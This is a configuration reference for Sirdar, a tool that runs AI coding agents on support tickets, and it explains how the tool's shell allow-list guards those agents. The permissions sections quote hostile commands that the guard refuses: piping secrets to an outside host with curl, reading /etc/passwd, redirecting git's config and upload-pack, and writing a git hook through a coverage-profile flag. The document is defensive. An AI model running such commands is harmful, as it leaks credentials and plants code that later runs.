# Configuration reference

`sirdar init` writes `.sirdar/config.yaml` for the current workspace with placeholders and
comments; every other command loads it by walking up from the working directory to the nearest
directory that has it. Unknown keys are an error, so a typo in the file fails at load time
rather than being silently ignored.

## Keys

| Key | Type | Default | Meaning |
|---|---|---|---|
| `workspace` | string | directory name (set by `init`) | A label for the workspace; not otherwise interpreted |
| `provider` | string | `claude` | Which agent drives runs: `claude`, `codex`, `qwen`, `openai` (Sirdar's own loop), or `acp` (any Agent Client Protocol agent) |
| `model` | string | `""` (provider default) | Model name passed to the provider; empty uses the provider's own default |
| `billing` | string | `subscription` | `subscription` strips `ANTHROPIC_API_KEY` from the agent's environment so it uses your CLI login; `api` leaves it in place so usage is billed to the key |
| `sources.tracker` | object, optional | unset | The tracker adapter; see Sources below |
| `sources.helpdesk` | object, optional | unset | The helpdesk adapter; see Sources below |
| `sources.*.adapter` | string | none (required) | `exec` (external adapter process), `zohodesk`/`zendesk`/`freshdesk`/`helpscout`/`intercom`/`hubspot`/`gorgias` (built in), or, for `sources.tracker`, one of `jira`, `linear`, `azdo`, `rally` (built in) |
| `sources.*.command` | string | none (required for `exec`) | Path to the adapter executable |
| `sources.*.orgId` | string | none (required for `zohodesk`) | Zoho Desk organisation id |
| `sources.*.baseUrl` | string | none (required for `zohodesk`); optional override for `zendesk`; `https://rally1.rallydev.com` (default for `rally`) | Zoho Desk API base URL, an override for Zendesk's `https://{subdomain}.zendesk.com`, or the Rally subscription host |
| `sources.*.token` | string | none (one of `token`/`auth` required for `zohodesk`) | Credential reference to a Zoho Desk access token (`env:NAME`, `keychain:SERVICE`, `file:PATH` or `cmd:COMMAND`) |
| `sources.*.auth` | object | none (one of `token`/`auth` required for `zohodesk`) | OAuth refresh-token grant; see Zoho Desk OAuth below |
| `sources.*.auth.clientId` | string | none (required with `auth`) | Credential reference to the Self Client's client id |
| `sources.*.auth.clientSecret` | string | none (required with `auth`) | Credential reference to the Self Client's client secret |
| `sources.*.auth.refreshToken` | string | none (required with `auth`) | Credential reference to the Self Client's refresh token |
| `sources.*.auth.accountsUrl` | string | derived from `baseUrl` | Zoho accounts server that issues access tokens |
| `sources.helpdesk.subdomain` | string | none (required for `zendesk`) | Zendesk account identifier, e.g. `acme` for `acme.zendesk.com` |
| `sources.helpdesk.oauthToken` | string | none (`zendesk` only; alternative to `email`+`apiToken`) | Credential reference to a Zendesk OAuth bearer token |
| `sources.helpdesk.domain` | string | none (required for `freshdesk`) | Freshdesk account host, e.g. `acme.freshdesk.com` |
| `sources.helpdesk.clientId` | string | none (required for `helpscout`) | Credential reference to the Help Scout app's OAuth2 client id |
| `sources.helpdesk.clientSecret` | string | none (required for `helpscout`) | Credential reference to the Help Scout app's OAuth2 client secret |
| `sources.helpdesk.accessToken` | string | none (required for `intercom` and `hubspot`) | Credential reference to an Intercom workspace access token or a HubSpot private-app token |
| `sources.helpdesk.account` | string | none (one of `account`/`baseUrl` required for `gorgias`) | Gorgias account identifier, e.g. `acme` for `acme.gorgias.com` |
| `sources.helpdesk.email` | string | none (required for `gorgias`; required with `apiToken` for `zendesk` basic auth) | The Gorgias login email sent as the HTTP Basic username, or the Zendesk account email; a plain address, not a credential reference |
| `sources.tracker.baseUrl` | string | none (required for `jira`) | Jira site URL (Cloud) or Data Center instance URL |
| `sources.tracker.deployment` | string | `auto` | `jira` only: `cloud`, `datacenter`, or `auto` (probes `/rest/api/2/serverInfo`) |
| `sources.tracker.email` | string | none (required for `jira` Cloud; required with `apiToken` for `zendesk` basic auth) | The Jira Cloud or Zendesk account email sent with `apiToken` as basic auth; a plain address, not a credential reference |
| `sources.tracker.apiToken` | string | none (required for `jira` Cloud; required with `email`, or use `oauthToken`, for `zendesk`) | Credential reference to a Jira Cloud API token, or a Zendesk API token |
| `sources.tracker.pat` | string | none (required for `jira` Data Center or `azdo`) | Credential reference to a Jira Data Center PAT or an Azure DevOps PAT |
| `sources.tracker.projectKey` | string | unset | `jira` only: scopes `List` to one project |
| `sources.tracker.epicLinkField` | string | unset (resolved by name via `/rest/api/2/field`) | `jira` only: Data Center epic-link custom field id or name |
| `sources.tracker.apiKey` | string | none (required for `linear`, `rally`; required for `freshdesk` and `gorgias`) | Credential reference to a Linear personal API key, a Rally API key, a Freshdesk API key, or a Gorgias API key (sent as the HTTP Basic password) |
| `sources.tracker.teamKey` | string | unset | `linear` only: default team key used to scope `List` |
| `sources.tracker.orgUrl` | string | none (required for `azdo`) | `https://dev.azure.com/{org}` (Services) or a Server collection URL |
| `sources.tracker.project` | string | none (required for `azdo`); unset for `rally` | Azure DevOps team project, or a Rally project `_ref`/ObjectID |
| `sources.tracker.helpdeskLinkDomain` | string | unset | `azdo` only: host suffix marking a `Hyperlink` relation as the helpdesk ticket |
| `sources.tracker.helpdeskField` | string | unset | `azdo`/`rally` only: custom field name/id carrying the helpdesk ticket reference |
| `sources.tracker.workspace` | string | none (required for `rally`) | Rally workspace `_ref` or ObjectID, scopes all queries |
| `sources.tracker.types` | list of string | `[Defect, HierarchicalRequirement]` | `rally` only: artifact types `Get` falls back through and `List` sweeps |
| `sources.tracker.helpdeskRef` | object, optional | unset | Description-regex fallback for the helpdesk reference; tracker only, see helpdeskRef fallback below |
| `sources.tracker.helpdeskRef.pattern` | string | none (required with `helpdeskRef`) | Go regex matched against the ticket description, with exactly one capture group holding the helpdesk link or id |
| `sources.tracker.helpdeskRef.idPattern` | string | unset | Go regex applied to `pattern`'s capture, with exactly one capture group holding the helpdesk ticket id |
| `notes.dir` | string | `.sirdar/notes` | Where rendered notes are copied; expands `~` and relative paths against the workspace root |
| `notes.templates` | string | `""` (embedded defaults) | Directory holding `triage.md.tmpl`, `rca.md.tmpl`, `resolution.md.tmpl` overrides |
| `notes.filenames.triage` | string | `"{key} {slug}.md"` | Filename pattern for triage notes |
| `notes.filenames.rca` | string | `"{key} RCA {slug}.md"` | Filename pattern for RCA notes |
| `notes.filenames.resolution` | string | `"{key} RES {slug}.md"` | Filename pattern for resolution notes |
| `language.notes` | string | `en` | Language code the engineer's note is written in, including the translated complaint; see Languages below |
| `language.customer` | string | `auto` | Language code for anything the customer reads (the triage note's reply draft, the RCA's customer summary); `auto` means the language of the ticket's first customer message |
| `language.rtlMarkup` | bool | `true` | Wrap a right-to-left paragraph the built-in templates emit in `<div dir="rtl">`, which Obsidian renders; ignored while `notes.templates` is set |
| `budget.maxTurns` | int | `120` |
 Model round-trips before a run is marked `over_budget`; see Budgets below |
| `budget.maxMinutes` | int | `25` | Wall-clock minutes before a run is cancelled and marked `over_budget` |
| `budget.maxUsd` | float | `5` | Cost, from provider usage events, before a run is marked `over_budget`; with Claude this is checked only once the session ends (see Budgets) |
| `concurrency` | int | `1` | Parallel runs across the keys passed to `sirdar triage`; overridable with `--concurrency` |
| `permissions.bash` | list of string | `[]` | Glob patterns a shell command must match to be allowed — the agent's `Bash` tool on Claude, its own `bash` in the openai loop, and Codex's command approvals; see Bash permission globs below |
| `permissions.fixBash` | list of string | `git status*`, `git diff*`, `git log*`, `git show*`, `git grep*`, `git blame*`, `dotnet build*`, `dotnet test*`, `npm test*`, `go build*`, `go test*`, `make *` | Glob patterns a `sirdar fix` session's `Bash` calls must match, in place of `permissions.bash`; same syntax, see `permissions.fixBash` below |
| `permissions.mcp` | list of string | `[]` | Glob patterns matched against an MCP tool's full name, on every provider; see MCP access below |
| `permissions.fetch` | list of string | `[]` | Hosts a session may fetch a URL from: `docs.example.com` exactly, `*.example.com` for its subdomains, `http://localhost:3000` for a service on this machine. Empty — the default — denies every fetch; see Web fetch below |
| `mcp.workspaceOnly` | bool | `true` | Start the session against `<workspace>/.mcp.json` alone — and against no MCP servers at all when there is no such file — so the operator's global MCP servers are not loaded. Applies to Claude (`--strict-mcp-config`) and Codex (a generated `CODEX_HOME`); see MCP access below |
| `notify` | object, optional | unset | Post a digest of every finished run to Slack, Teams or a webhook; see Notifications below |
| `notify.on` | list of string | all four terminal states | Which of `completed`, `failed`, `over_budget`, `blocked` are worth a message |
| `notify.includeTitle` | bool | `false` | Send the ticket title; off because a support subject line routinely names the customer |
| `notify.slack.webhookUrl` | string | none (required with `slack`) | Credential reference to a Slack incoming-webhook URL — the URL is the credential |
| `notify.teams.webhookUrl` | string | none (required with `teams`) | Credential reference to a Teams Workflows or connector URL |
| `notify.generic[].url` | string | none (required) | Receiver for the event as JSON; `https`, or `http` on loopback |
| `notify.generic[].headers` | map | unset | Headers to send; an `env:`/`keychain:` value is resolved, anything else is sent literally — except a name that looks like a credential (`Authorization`, or one ending in `-Token`, `-Key` or `-Secret`), which must be a reference |
| `notify.generic[].secret` | string | unset | Credential reference to the shared secret signing the body as `X-Sirdar-Signature` |
| `attachments.maxBytes` | int | `10485760` (10 MiB) | Attachments larger than this are dropped from the bundle and named in a warning |
| `fix.prIncludesComplaint` | bool | `false` | Put the customer's own words from the triage note in the pull request body's Symptom section; off by default, because a pull request is often public |
| `playbooks` | string | `.sirdar/playbooks` | Directory of playbook markdown files loaded into the prompt, in filename order |
| `providers.claude.path` | string | `""` (look up `claude` on `PATH`) | Path to the Claude Code binary |
| `providers.codex.path` | string | `""` (look up `codex` on `PATH`) | Path to the Codex binary |
| `openai.baseUrl` | string | none (required for `provider: openai`) | Chat Completions base URL, e.g. `https://openrouter.ai/api/v1` or `http://localhost:11434/v1` |
| `openai.apiKey` | string, optional | unset | Credential reference (`env:NAME`, `keychain:SERVICE`, `file:PATH` or `cmd:COMMAND`) for the endpoint's key; omit for a local server that needs none |
| `openai.model` | string | none (required for `provider: openai`) | Model the endpoint serves, e.g. `qwen/qwen3-coder`; `--model` and `model` override it |
| `openai.maxContextTokens` | int | `128000` | Context window the loop trims old tool results against |
| `openai.price.inputPerMTok` | float, optional | `0` | USD per million prompt tokens, used for cost and the `budget.maxUsd` check |
| `openai.price.outputPerMTok` | float, optional | `0` | USD per million completion tokens |
| `openai.temperature` | float, optional | unset (server default) | Sampling temperature sent with every request |
| `openai.extraHeaders` | map, optional | unset | Extra request headers; `Authorization` and `Content-Type` are ignored here, the client owns them |
| `qwen.path` | string, optional | `""` (look up `qwen` on `PATH`) | Path to the Qwen Code binary |
| `qwen.baseUrl` | string, optional | unset | OpenAI-compatible base URL the CLI is pointed at; with the whole block unset it uses its own login |
| `qwen.model` | string, optional | unset | Model the endpoint serves; required alongside `qwen.baseUrl`. `--model` and `model` override it |
| `qwen.apiKey` | string, optional | unset | Credential reference (`env:NAME` or `keychain:SERVICE`) for the endpoint's key; required alongside `qwen.baseUrl` |
| `webhooks.enabled` | bool | `false` | Whether `sirdar serve` registers the inbound trigger endpoints at all; with it off every path under `/hooks/` is a 404 |
| `webhooks.sources.<name>` | object | unset | One per enabled source: `jira`, `linear`, `azdo`, `rally`, `zendesk`, `freshdesk`, `intercom`, `hubspot`, `generic`. An unknown name fails config load |
| `webhooks.sources.<name>.secret` | string | none (required, except `azdo`) | Credential ref for the signing secret or shared secret |
| `webhooks.sources.azdo.username` | string | none (required) | Basic-auth username configured on the Azure DevOps service hook; written literally, it is not a secret |
| `webhooks.sources.azdo.password` | string | none (required) | Credential ref for the matching password |
| `webhooks.match.assignee` | string, optional | unset | `me` (the account email on `sources.tracker`, else `sources.helpdesk`) or an address or account id. A delivery naming a different assignee, or none at all, is skipped |
| `webhooks.match.statuses` | list, optional | unset | Accepted statuses, matched case-insensitively against whatever the payload carries; a payload naming no status passes |
| `webhooks.match.labels` | list, optional | unset | Accepted labels, same semantics |
| `webhooks.cooldown` | duration, optional | `10m` | A key triaged this recently is skipped; `0s` disables the cooldown |
| `acp.command` | string | none (required for `provider: acp`) | The ACP agent's program: `gemini`, `goose`, `opencode`, `npx` |
| `acp.args` | list of string, optional | unset | The rest of the agent's command line, e.g. `["--experimental-acp"]` |
| `acp.env` | map, optional | unset | Literal environment entries added to the agent's environment; these are values, not credential references |

`{key}` and `{slug}` in a filename pattern are replaced with the ticket key and a slugified
title. A pattern may also contain `/` segments to file notes into a subdirectory of `notes.dir`
that a vault already expects, e.g. `notes.filenames.triage: "Triage/{key} {slug}.md"` files
triage notes under `Triage/`, and `RCA/{key} RCA {slug}.md` / `Resolutions/{key} RES {slug}.md`
do the same for RCA and resolution notes. Sirdar creates any missing subdirectory when it writes
the note. A segment that is empty (including the one a leading `/` produces) or exactly `..` is
dropped rather than followed, so a pattern can't write outside `notes.dir`; re-triage still finds
and overwrites a triage note filed this way, searching `notes.dir` recursively (skipping
dot-directories such as `.obsidian`) for a match by key and frontmatter tag rather than by exact
path. `provider`, `billing`, and `concurrency` are validated at load time: an unrecognised
`provider` or `billing` value, or a `concurrency` below 1, fails config load with a message
naming the offending key. Budget values must all be greater than zero. A configured source's
adapter-specific fields are required only for that adapter; `sources.tracker` and
`sources.helpdesk` are each optional, but a source config with no `adapter` set is an error.

## Inbound webhook triggers

The `webhooks` block configures the endpoints `sirdar serve` exposes at
`POST /hooks/<workspace-id>/<source>`, so a tracker or helpdesk can start a triage when a ticket
is assigned. Everything in it is validated at load time whether or not it is enabled, so a
mistyped source name or a secret written out literally fails the first time the workspace loads
rather than the first time a hook fires. `docs/webhooks.md` has the per-source setup steps, the
signing schemes, and the `--allow-remote` warning.

## Built-in trackers

`jira`, `linear`, `azdo` and `rally` are compiled into Sirdar, so they need no adapter process.
They are tracker adapters: naming one under `sources.helpdesk` fails config load and points you
at `sources.tracker`. Config load checks what each one cannot work without:

| Adapter | Required | Notes |
|---|---|---|
| `jira` | `baseUrl`, and either `email` + `apiToken` (Cloud) or `pat` (Data Center) | `deployment` must be `cloud`, `datacenter` or `auto` |
| `linear` | `apiKey` | The endpoint is fixed at `https://api.linear.app/graphql` |
| `azdo` | `orgUrl`, `project`, `pat` | The PAT needs the `vso.work` scope |
| `rally` | `apiKey`, `workspace` | `baseUrl` defaults to `https://rally1.rallydev.com` |

Each of these trackers also carries the conversation on the issue itself, so it can fill the
helpdesk role as well: when `sources.helpdesk` is unset, Sirdar reads the thread and the
attachments from the same adapter. A configured `sources.helpdesk` always wins.

`sirdar doctor` prints one row per built-in tracker, from a single authenticated call against
the cheapest endpoint the API has — Jira's `serverInfo`, Linear's `viewer`, the Azure DevOps
project, Rally's current user:

```
[OK] sources.tracker (jira) — reachable (https://acme.atlassian.net)
```

### helpdeskRef fallback

A tracker that has no native link to the helpdesk — no Jira Service Management request, no
Linear customer-request attachment, no Azure DevOps hyperlink or custom field — often still
names the support ticket in its description, as a URL somebody pasted. `helpdeskRef` turns that
into a rule the workspace owns:

```yaml
sources:
  tracker:
    helpdeskRef:
      pattern: 'Zoho Ticket URL:\s*(\S+)'
      idPattern: '(\d+)$'
```

`pattern` is matched against the ticket description and its one capture group is the reference;
`idPattern`, when set, is applied to that capture and its one capture group is the id Sirdar
passes to the helpdesk. Both are Go regular expressions, both are compiled at config load, and
both must have exactly one capture group — a pattern with none or with several fails the load
rather than a run. The fallback only fills in what the adapter left empty, so a tracker with
native linkage is never overridden. A description that does not match leaves the reference
empty and Sirdar reads the helpdesk by the ticket key instead; a `pattern` that matched while
`idPattern` did not is recorded as a run warning, because that is a rule to fix rather than a
ticket without a link.

### List limits

`ListFilter.Limit` is capped by the adapters, not by the caller: `0` means 100 results and the
maximum is 200. An adapter paginates its API as far as it has to in order to fill the limit, and
never returns more than it was asked for.

## Built-in helpdesks

`zohodesk`, `zendesk`, `freshdesk`, `helpscout`, `intercom`, `hubspot` and `gorgias` are compiled into
Sirdar; only `zohodesk` needs a separate "Zoho Desk OAuth" section below because of its
refresh-token grant. Config load checks what each of the others cannot work without:

| Adapter | Required | Notes |
|---|---|---|
| `zendesk` | `subdomain`, and either `email` + `apiToken` or `oauthToken` | `baseUrl` optionally overrides `https://{subdomain}.zendesk.com` |
| `freshdesk` | `domain`, `apiKey` | `domain` is the full account host, e.g. `acme.freshdesk.com` |
| `helpscout` | `clientId`, `clientSecret` | Help Scout has no API-key mode; Sirdar mints its own access tokens from the pair |
| `intercom` | `accessToken` | A workspace access token from Intercom's Developer Hub |
| `hubspot` | `accessToken` | A private-app token (`pat-na1-…`); HubSpot retired API keys in 2022 |
| `gorgias` | one of `account`/`baseUrl`, `email`, `apiKey` | HTTP Basic: the login `email` is the username, `apiKey` the password. `account` is the identifier alone, e.g. `acme` for `acme.gorgias.com` |

`helpscout`, `intercom` and `hubspot` talk to one fixed vendor host each — `api.helpscout.net`,
`api.intercom.io`, `api.hubapi.com` — so none of them takes a `baseUrl`. `gorgias`, like
`zendesk` and `freshdesk`, gives every account its own host, so it needs one named. An Intercom workspace on the EU or AU
data-residency host is not supported by this adapter yet; calls to the US host are proxied by
Intercom, which works but is not what Intercom recommends.

```yaml
sources:
  helpdesk:
    adapter: zendesk
    subdomain: acme
    email: env:ZENDESK_EMAIL
    apiToken: env:ZENDESK_API_TOKEN
```

```yaml
sources:
  helpdesk:
    adapter: freshdesk
    domain: acme.freshdesk.com
    apiKey: env:FRESHDESK_API_KEY
```

```yaml
sources:
  helpdesk:
    adapter: helpscout
    clientId: keychain:helpscout-client-id
    clientSecret: keychain:helpscout-client-secret
```

```yaml
sources:
  helpdesk:
    adapter: intercom
    accessToken: env:INTERCOM_ACCESS_TOKEN
```

```yaml
sources:
  helpdesk:
    adapter: hubspot
    accessToken: env:HUBSPOT_PRIVATE_APP_TOKEN
```

```yaml
sources:
  helpdesk:
    adapter: gorgias
    account: acme
    email: ops@acme.com
    apiKey: env:GORGIAS_API_KEY
```

`sirdar doctor` prints one row per built-in helpdesk, from a single authenticated call — the
signed-in user for `zendesk`, the signed-in agent for `freshdesk`, one page of one mailbox for
`helpscout`, `/me` for `intercom`, the account details for `hubspot`, `/api/account` for
`gorgias` — and names who the connection authenticates as, never the credential itself:

```
[OK] sources.helpdesk (zendesk) — reachable as you@acme.com
[OK] sources.helpdesk (freshdesk) — reachable as acme.freshdesk.com
[OK] sources.helpdesk (helpscout) — reachable as the Help Scout app
[OK] sources.helpdesk (intercom) — reachable as the workspace access token
[OK] sources.helpdesk (hubspot) — reachable as the private app token
[OK] sources.helpdesk (gorgias) — reachable as ops@acme.com
```

A Zendesk source authenticated with `oauthToken` instead of `email`/`apiToken` reports `reachable
as oauth`, since there is no account email to show for that grant. `helpscout`, `intercom` and
`hubspot` name the kind of grant rather than an account, because none of their probes returns an
account identifier worth printing — the row itself is the proof the credential was accepted.

## Credential references

`sources.*.token` (and any credential in config) is never a literal secret: config load rejects
a value that doesn't start with one of four schemes, all of which resolve on macOS, Linux and
Windows.

- `env:NAME` reads the environment variable `NAME` at fetch time.
- `keychain:SERVICE` reads the operating system's own credential store: the macOS login
  keychain via `security`, the freedesktop Secret Service via `secret-tool` (with `pass` as a
  fallback) on Linux and the BSDs, the Windows Credential Manager via `CredRead`.
- `file:PATH` reads a file that holds nothing but the secret. A leading `~` expands, one
  trailing newline is dropped, and a file readable beyond its owner is refused.
- `cmd:COMMAND` takes the standard output of a credential helper — `op read`, `bw get`,
  `vault kv get`, `gopass show` — with a 10-second timeout.

**[`docs/credentials.md`](credentials.md) is the whole story**: what to run to store a secret on
each OS, the `file:` permission rule, `cmd:` recipes for the common password managers, and the
rule that Sirdar never writes a credential anywhere.

Resolved values are held in memory only: never written to a run directory, and never placed in
the agent's environment. Every `env:` variable named anywhere in `sources.*` — `token`, the
built-in adapters' `apiToken`, `pat`, `apiKey` and `oauthToken`, and all three parts of an `auth`
grant — is stripped from the environment the agent process inherits, so a session that can run
shell commands cannot read them back out. The `notify:` block's webhook URLs, header values and
signing secret are stripped the same way, for the same reason. `email` is the one adapter credential field that is not
a reference: it is an account name, not a secret, and it is left in place.

## Zoho Desk OAuth

A Zoho Desk access token expires an hour after it is issued, so `token:` cannot carry a run
nobody is watching. `auth:` names a [Zoho Self
Client](https://www.zoho.com/accounts/protocol/oauth/self-client/overview.html) instead, and
Sirdar exchanges its refresh token for a fresh access token whenever the one it holds is within
a minute of expiry, or when Desk rejects it (one retry per request, then the failure stands).
Set `token` or `auth`, not both.

```yaml
sources:
  helpdesk:
    adapter: zohodesk
    orgId: "60044805777"
    baseUrl: https://desk.zoho.in
    auth:
      clientId: keychain:zoho-desk-client-id
      clientSecret: keychain:zoho-desk-client-secret
      refreshToken: keychain:zoho-desk-refresh-token
```

`accountsUrl` is the accounts server for the data centre the desk lives in, and is normally left
out: it is derived from `baseUrl` for the four Zoho hosts below. A `baseUrl` outside that list
has to name it, since sending the grant to the wrong data centre's accounts server only fails.

| `baseUrl` host | derived `accountsUrl` |
|---|---|
| `desk.zoho.in` | `https://accounts.zoho.in` |
| `desk.zoho.com` | `https://accounts.zoho.com` |
| `desk.zoho.eu` | `https://accounts.zoho.eu` |
| `desk.zoho.com.au` | `https://accounts.zoho.com.au` |

`sirdar doctor` performs one refresh and reports it, so a revoked grant is caught before a run
spends an agent session on it:

```
[OK] zoho oauth — access token obtained, expires in 3600s
[OK] sources.helpdesk (zohodesk) — https://desk.zoho.in
```

A refused grant reports the reason the accounts server gave — `invalid_client`, `invalid_code`
— and never any part of the credentials.

## Notifications

A `notify:` block posts a short digest of every finished run to a Slack channel, a Microsoft
Teams channel, or any HTTP receiver. Every destination is optional and they can be combined;
with no block, nothing is posted.

```yaml
notify:
  on: [completed, failed, over_budget, blocked]   # default: all four
  includeTitle: false
  slack:
    webhookUrl: keychain:sirdar-slack-webhook
  teams:
    webhookUrl: env:TEAMS_WEBHOOK
  generic:
    - url: https://hooks.example.com/sirdar
      headers:
        Authorization: env:SIRDAR_HOOK_TOKEN
      secret: env:SIRDAR_HOOK_SECRET
```

The message carries the run's metadata — key, state, confidence, classification, service, run
id, turns, cost, duration, the reason a run ended badly, and the paths and links a human follows
— and no part of a note's body. The ticket title is sent only with `includeTitle: true`, because
a support ticket's subject line routinely names the customer who filed it and a chat channel is
a wider audience than the notes directory.

A chat `webhookUrl` is a credential reference, never the URL itself: an incoming-webhook URL
carries its own authorisation in its path. A generic hook's `url` is a plain URL, because the
receiver authenticates through the headers instead; those header values, and `secret`, are
references when they carry a credential. Every `env:` name the block uses is stripped from the
agent session's environment along with the adapters' credentials.

A post that fails is a warning on the run and never a failed run: the note is already on disk
when it goes out, and the run does not return until every destination's post has settled. Each
destination gets a hard 15-second ceiling — the request, and one retry on `429` or `5xx`
honouring a `Retry-After` of up to 30 seconds, all inside that budget — and interrupting the run
does not cut a post short, since the channel is still owed a message about a run whose note
already exists. The failure lands in `state.json`'s `warnings` and on the progress stream, with
the webhook URL reduced to its host and no part of the receiver's response, so the line is safe
to paste. `SIRDAR_NO_NOTIFY=1`, `sirdar triage --no-notify` and `sirdar rca --no-notify` silence
one invocation.

Setting up each destination — the Slack app, the Teams workflow, and a receiver that verifies
the HMAC signature — is in `docs/notifications.md`.

## Budgets

Three budgets end a run early, and they do not all see the same thing.

**`budget.maxTurns` counts model round-trips.** One turn is one assistant message that calls a
tool or gives the final answer — the same unit the Claude CLI reports as `num_turns` in its
result line. Thinking blocks are part of the round-trip they precede, not turns of their own,
and a response that calls three tools in parallel is three round-trips because the CLI counts
it that way. Sirdar keeps a running count while the session streams and reconciles it to the
CLI's `num_turns` when the result line arrives, so `state.json` ends the run holding the
provider's own figure. A real triage of a busy ticket takes 40–60 turns; the default of 120
leaves room for a hard one. (An earlier version counted every assistant *line*, which ran about
1.5x ahead — 61 against the CLI's 41 — and cancelled a session mid-tool on a budget it had not
spent.)

**`budget.maxUsd` is an end-of-run check with Claude.** Claude Code reports cost only in its
result line, so `state.json` shows `costUsd: 0` for the whole of a running session no matter
how much it is spending, and progress views show `n/a` rather than a `$0.00` that would read
like a free run. The cost budget therefore records an overspend after the fact; it cannot stop
one in flight. `maxTurns` and `maxMinutes` are the budgets that bite while a run is going.
Tokens are the exception: input and output counts do accumulate live, from each assistant
message's usage, and the input count includes cache-creation and cache-read tokens.

**`budget.maxMinutes` is wall-clock**, measured from the moment the session starts, and
cancels the session when it expires.

A budget that expires *after* the note has been written and filed does not throw the note away:
the run completes and the overrun is recorded as a warning on it.

## `permissions.bash` glob semantics

Each entry in `permissions.bash` is a glob pattern matched against one segment of the agent's
`Bash` tool command, trimmed of leading and trailing whitespace. The command is split on `|`,
`||`, `&&`, `;` and a lone `&` — separators inside single or double quotes are text, not
separators, and an `&` that belongs to a redirection (`2>&1`, `>&2`, `&>`) is part of its
command — and **every** segment has to match a pattern for the command to be allowed;
everything else, including every non-`Bash` write tool, is denied.

That means `rg -n foo | head -50` needs both `rg *` and `head *` in the list, and a `cat *`
pattern no longer approves `cat secrets | curl -T- example.com`.

Two kinds of command are refused before the patterns are even consulted, because the pattern
would be approving something it cannot see:

- **Command and process substitution.** `$(...)`, a backquote, and `<(...)` all produce text
  or a command at run time, so what would actually run cannot be read off the string the
  policy is judging. Inside single or double quotes they are ordinary characters and pass.
- **Redirection.** `>`, `>>`, `<` and `&>` name a file the allow-list never approved:
  `git log` is a read, `git log > ~/.zshrc` is not, and one pattern would cover both. The
  refusal names the operator it found. Quoted, as in `rg "a>b"`, it is a search pattern and
  passes. The two exceptions are `2>&1` and `2>/dev/null`, which write nothing and are how an
  agent quiets a probe; every other `2>` target is a file and is refused.

A command also has to stay inside the workspace. Every argument that looks like a path is
resolved against the workspace root, and one that lands outside it is refused: `cat go.mod`
runs, `cat ../../../etc/passwd` and `cat /etc/passwd` do not, and neither does anything
starting with `~`. Read that as a guard rail rather than a boundary — it reads the command as
text, so it does not follow symlinks, does not know which of a program's arguments are paths,
and cannot see a path the program builds for itself at run time. **It is a heuristic, not a
sandbox.** A run that must be confined for real needs a container around it; this is the part
that catches the obvious ways out.

- `*` matches any run of characters, including spaces and `/`. `git log*` matches
  `git log --oneline -20` and `git log -- some/path`.
  The pattern is a full-string match, not a prefix, so `git log*` also matches
  `git logout`, not just `git log ...`.
- A pattern ending in ` *` reads as "with any arguments", and matches the bare command too:
  `ls *` allows both `ls -la` and the `ls` next to it in a compound command.
- `?` matches exactly one character.
- Matching is case-sensitive.
- The pattern is anchored to the whole command string, not a prefix or substring: `git log`
  without a trailing `*` matches only the exact command `git log`, with no arguments.

## `permissions.fixBash`

`sirdar fix` is the one session allowed to change the workspace, and it needs a different set
of shell commands than a triage run does: it has to branch, build and test. Rather than widen
`permissions.bash` — which would hand every read-only triage run the same reach — a fix session
is matched against its own list.

The syntax is exactly the one above: the same segment splitting, the same refusal of
substitution and redirection, the same workspace-root check on anything that looks like a path.
Only the list changes, and only for `sirdar fix`.

The default is the git commands that read the repository, and the build and test commands a
fix has to run before it can claim to work:

```yaml
permissions:
  fixBash:
    - "git status*"
    - "git diff*"
    - "git log*"
    - "git show*"
    - "git grep*"
    - "git blame*"
    - "dotnet build*"
    - "dotnet test*"
    - "npm test*"
    - "go build*"
    - "go test*"
    - "make *"
```

The git entries are named one by one rather than covered by `git *`, and that is deliberate.
Sirdar makes the branch, the commit and the push itself — after the JSON report comes back and
after the deviation check — so nothing in the flow needs the agent to reach `git commit`,
`git push`, `git reset` or `git config`. A blanket `git *` hands all of them to whatever the
session reads in a ticket.

Naming your own list replaces the default outright — it is a starting point, not a floor — so
include whatever of it you still want:

```yaml
permissions:
  fixBash:
    - "git log*"
    - "git diff*"
    - "just *"
    - "pnpm test*"
```

Some git flags are refused whatever pattern you write, and the `config` subcommand is refused
outright, because each of them moves where git reads its configuration, writes its output, or
runs code from. Two groups are denied differently, by where in the command they can legally
appear:

- `--output`, `--output-directory`, `-o`, `--upload-pack` and `--receive-pack` are denied
  wherever they fall in the command, because git accepts them after the subcommand too:
  `git diff --output=~/.zshrc` writes a file through a pattern that was only meant to read one,
  and `git fetch --upload-pack=/tmp/evil` runs an arbitrary program in place of git's own
  upload-pack.
- `-c`, `-C`, `--git-dir`, `--work-tree`, `--exec-path` and `--config-env` are top-level git
  options, valid only *before* the subcommand, and are denied only there: `git -c
  core.hooksPath=/tmp/h status` installs a hook directory for every git command that follows and
  is refused, while `git grep -c foo` (counts matches) and `git rev-parse --git-dir` (prints a
  path) reuse the same short flag after the subcommand for an unrelated meaning and are allowed.

A `GIT_*` environment variable reaches the same configuration as those flags — `GIT_DIR`,
`GIT_WORK_TREE` and the rest — so an assignment naming one is refused wherever it appears ahead
of a command, git or not: `GIT_DIR=/tmp/other/.git git log`, `env GIT_DIR=/tmp/other/.git git
log`, and `GIT_DIR=/tmp/other/.git make test`, which redirects a git invocation the Makefile
target runs internally, are all denied. An assignment that names an unrelated variable
(`LANG=C git log`) or a bare `env` with none (`env git log`) is not refused by this rule; the
command underneath is still judged by everything above.

What the list does not do is decide whether the session may edit files: a fix session gets
`Edit`, `Write` and `MultiEdit` regardless, and a triage session never does. Where those may
write is a separate rule, and not a configurable one — every edit is resolved through symlinks
and refused unless it lands inside the workspace root, and refused again for anything under a
`.git/` directory at any depth, under the workspace's own `.sirdar/`, or under the directory
this repository sets `core.hooksPath` to, which Sirdar reads once at the start of the session
(a leading `~` or `~user` in the configured value is expanded to a home directory first, the
same way git itself expands it, so `core.hooksPath = ~/x` reserves and snapshots the directory
git actually runs hooks from rather than a literal `~x` entry inside the workspace). The
comparison folds case, so `.GIT/hooks/pre-commit` is the same refusal as `.git/hooks/pre-commit`
on the case-insensitive filesystem macOS and Windows ship. A fix changes source, not hooks and
not Sirdar's records.

The same reservation reaches a `permissions.fixBash` command's own arguments, not only `Edit` and
`Write`: a flag's path value — joined with `=`, as in `--coverprofile=.git/hooks/pre-commit`, or
the next token after a bare flag, as in `-o .githooks` — is refused when it names a reserved
directory, exactly as a write through `Edit` would be. `go test -coverprofile=.git/hooks/pre-commit`
matches a `go test*` pattern and is refused anyway, because the coverage profile it names is a
hook the next commit runs, not a coverage profile. This check is narrower than the workspace-root
check above it: it applies only to a flag's value, not to every plain argument, so `cd
.sirdar/runs && ls -la` — reading Sirdar's own run records, not writing to them — still goes
through.

